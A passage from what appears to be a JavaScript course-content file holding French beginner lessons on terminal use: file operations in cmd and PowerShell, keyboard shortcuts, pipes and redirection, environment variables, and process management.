\`\`\`cmd
copy fichier.txt copie.txt          :: copier un fichier
copy fichier.txt C:\\autre\\         :: copier vers un dossier
xcopy mon-projet\\ sauvegarde\\ /E  :: copier un dossier (récursif)
\`\`\`

### Déplacer / Renommer
\`\`\`cmd
ren ancien.txt nouveau.txt          :: renommer
move fichier.txt C:\\autre\\         :: déplacer
\`\`\`

### Supprimer
\`\`\`cmd
del fichier.txt                     :: supprimer un fichier
rmdir /s /q mon-dossier             :: supprimer un dossier
\`\`\`

### Lire des fichiers
\`\`\`cmd
type fichier.txt                    :: afficher le contenu
more fichier.txt                    :: afficher page par page
\`\`\`

### Rechercher
\`\`\`cmd
dir /s /b *.txt                     :: trouver des fichiers par pattern
findstr "erreur" fichier.log        :: chercher du texte dans un fichier
\`\`\`

---

## Windows (PowerShell)

\`\`\`powershell
# Copier
Copy-Item fichier.txt copie.txt
Copy-Item -Recurse mon-projet\\ sauvegarde\\

# Déplacer / Renommer
Rename-Item ancien.txt nouveau.txt
Move-Item fichier.txt C:\\autre\\

# Supprimer
Remove-Item fichier.txt
Remove-Item -Recurse -Force mon-dossier\\

# Lire
Get-Content fichier.txt
Get-Content -Tail 10 fichier.txt    # 10 dernières lignes

# Rechercher
Get-ChildItem -Recurse -Filter "*.txt"
Select-String "erreur" fichier.log
\`\`\`

## Tableau comparatif

| Action | macOS/Linux | Windows cmd | PowerShell |
|--------|-------------|-------------|------------|
| Copier fichier | \`cp\` | \`copy\` | \`Copy-Item\` |
| Copier dossier | \`cp -r\` | \`xcopy /E\` | \`Copy-Item -Recurse\` |
| Déplacer | \`mv\` | \`move\` | \`Move-Item\` |
| Renommer | \`mv\` | \`ren\` | \`Rename-Item\` |
| Supprimer fichier | \`rm\` | \`del\` | \`Remove-Item\` |
| Supprimer dossier | \`rm -r\` | \`rmdir /s /q\` | \`Remove-Item -Recurse\` |
| Lire un fichier | \`cat\` | \`type\` | \`Get-Content\` |
| Chercher texte | \`grep\` | \`findstr\` | \`Select-String\` |`
      },
      {
        id: "terminal-astuces",
        title: "Astuces et raccourcis indispensables",
        duration: "10 min",
        content: `# Astuces et raccourcis indispensables

Ces astuces vont multiplier ta productivité dans le terminal.

## Raccourcis clavier universels

| Raccourci | Action |
|-----------|--------|
| \`↑\` / \`↓\` | Naviguer dans l'historique des commandes |
| \`Tab\` | Auto-complétion (nom de fichier, commande) |
| \`Tab Tab\` | Lister toutes les complétions possibles |
| \`Ctrl+C\` | Annuler / arrêter une commande en cours |
| \`Ctrl+L\` | Effacer l'écran (ou taper \`clear\`) |
| \`Ctrl+A\` | Aller au début de la ligne |
| \`Ctrl+E\` | Aller à la fin de la ligne |
| \`Ctrl+U\` | Effacer du curseur au début de la ligne |

## Opérateurs pratiques (macOS/Linux et PowerShell)

### Chaîner des commandes
\`\`\`bash
mkdir projet && cd projet       # exécuter si la première réussit
commande1 ; commande2           # exécuter les deux quoi qu'il arrive
commande1 || commande2          # exécuter la seconde si la première échoue
\`\`\`

### Redirection
\`\`\`bash
ls > liste.txt                  # écrire la sortie dans un fichier
ls >> liste.txt                 # ajouter à la fin du fichier
commande 2> erreurs.txt         # rediriger les erreurs
\`\`\`

### Pipe (|) — enchaîner les commandes
\`\`\`bash
ls -la | grep ".js"             # filtrer la liste des fichiers
cat fichier.txt | wc -l         # compter les lignes
history | grep "git"            # chercher dans l'historique
\`\`\`

## Variables et environnement

**macOS/Linux :**
\`\`\`bash
echo $HOME                      # afficher une variable
echo $PATH                      # chemin des exécutables
export MA_VAR="valeur"          # définir une variable de session
\`\`\`

**Windows cmd :**
\`\`\`cmd
echo %USERPROFILE%              :: dossier personnel
echo %PATH%                     :: chemin des exécutables
set MA_VAR=valeur               :: définir une variable de session
\`\`\`

**PowerShell :**
\`\`\`powershell
echo $env:USERPROFILE           # dossier personnel
echo $env:PATH
$env:MA_VAR = "valeur"          # définir une variable
\`\`\`

## Commandes utiles au quotidien

**macOS/Linux :**
\`\`\`bash
history                         # voir l'historique des commandes
which python3                   # trouver où est installé un programme
man ls                          # manuel d'aide (q pour quitter)
ls --help                       # aide rapide
open .                          # ouvrir le dossier courant dans Finder
code .                          # ouvrir VS Code dans le dossier courant
\`\`\`

**Windows cmd :**
\`\`\`cmd
doskey /history                 :: historique des commandes
where python                    :: trouver où est installé un programme
help dir                        :: aide sur une commande
cls                             :: effacer l'écran
start .                         :: ouvrir le dossier dans l'Explorateur
code .                          :: ouvrir VS Code
\`\`\`

**PowerShell :**
\`\`\`powershell
Get-History                     # historique
Get-Command python               # trouver un programme
Get-Help Get-ChildItem          # aide détaillée
Clear-Host                      # effacer l'écran
Invoke-Item .                   # ouvrir dans l'Explorateur
code .                          # ouvrir VS Code
\`\`\`

## Gérer les processus

**macOS/Linux :**
\`\`\`bash
ps aux                          # lister les processus
kill 1234                       # arrêter un processus (par son PID)
top                             # moniteur de processus interactif
\`\`\`

**Windows :**
\`\`\`cmd
tasklist                        :: lister les processus
taskkill /PID 1234 /F           :: arrêter un processus
\`\`\`

**PowerShell :**
\`\`\`powershell
Get-Process                     # lister les processus
Stop-Process -Id 1234           # arrêter un processus
\`\`\`

## Mémo final

> **La règle d'or** : si tu ne sais pas ce que fait une commande, utilise \`man commande\` (macOS/Linux) ou \`Get-Help commande\` (PowerShell) avant de l'exécuter.`
      }
    ]
  }
];
